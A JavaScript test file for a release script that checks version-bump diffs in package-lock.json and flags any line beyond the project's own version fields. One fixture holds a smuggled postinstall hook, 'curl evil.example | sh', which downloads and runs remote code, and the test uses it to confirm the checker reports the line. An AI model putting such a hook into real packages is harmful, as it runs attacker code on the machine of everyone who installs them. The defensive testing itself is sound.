'use strict';

// The version bump is the one edit in this repo that reaches every other user
// without being run first: src/updateCheck.js reads package.json off main, so
// a release commit is what their dojo pulls. A find/replace of the old version
// string is the failure mode — package-lock.json holds a "version" for every
// dependency, and one of them eventually matches the project's.
//
// scripts/release.js bumps with `npm version`, which cannot make that mistake,
// and then checks the resulting diff. This covers the check.
const assert = require('assert');
const { offendingDiffLines, SEMVER } = require('../../scripts/release');

// --unified=0, so a hunk is only its changed lines.
function diff(lines) {
	return [
		'diff --git a/package-lock.json b/package-lock.json',
		'--- a/package-lock.json',
		'+++ b/package-lock.json',
		'@@ -1,1 +1,1 @@'
	].concat(lines).join('\n');
}

describe('release bump diff check', function () {
	it('accepts a diff that only moves the project version fields', function () {
		const clean = diff([
			'-\t"version": "0.12.0",',
			'+\t"version": "0.13.0",',
			'-\t\t\t"version": "0.12.0",',
			'+\t\t\t"version": "0.13.0",'
		]);
		assert.deepStrictEqual(offendingDiffLines(clean), []);
	});

	// The real regression: a blind replace rewrote node_modules/caseless from
	// 0.12.0 to 0.13.0, leaving it inconsistent with its own resolved URL and
	// integrity hash. The version LINE looks identical — what gives it away is
	// that the diff carries more than the two project fields.
	it('is not fooled by a dependency version — it is the extra lines that show', function () {
		const withDependency = diff([
			'-\t"version": "0.12.0",',
			'+\t"version": "0.13.0",',
			'-\t\t\t"version": "0.12.0",',
			'+\t\t\t"version": "0.13.0",',
			'-\t\t\t"resolved": "https://registry.npmjs.org/caseless/-/caseless-0.12.0.tgz",',
			'+\t\t\t"resolved": "https://registry.npmjs.org/caseless/-/caseless-0.13.0.tgz",'
		]);
		const bad = offendingDiffLines(withDependency);
		assert.strictEqual(bad.length, 2, 'the resolved URL change is reported');
		assert.ok(bad.every(function (line) { return /resolved/.test(line); }));
	});

	it('reports any other edit smuggled into the same commit', function () {
		const sneaky = diff([
			'-\t"version": "0.12.0",',
			'+\t"version": "0.13.0",',
			'+\t\t"postinstall": "curl evil.example | sh",'
		]);
		assert.deepStrictEqual(offendingDiffLines(sneaky), ['+\t\t"postinstall": "curl evil.example | sh",']);
	});

	it('says so rather than passing when git could not be read', function () {
		assert.strictEqual(offendingDiffLines(null), null);
	});

	it('only accepts a real semver', function () {
		for (const good of ['0.13.0', '1.0.0', '0.13.0-rc.1']) assert.ok(SEMVER.test(good), good);
		for (const bad of ['0.13', 'v0.13.0', '0.13.0.1', '', 'latest', '01.2.3']) assert.ok(!SEMVER.test(bad), bad);
	});
});
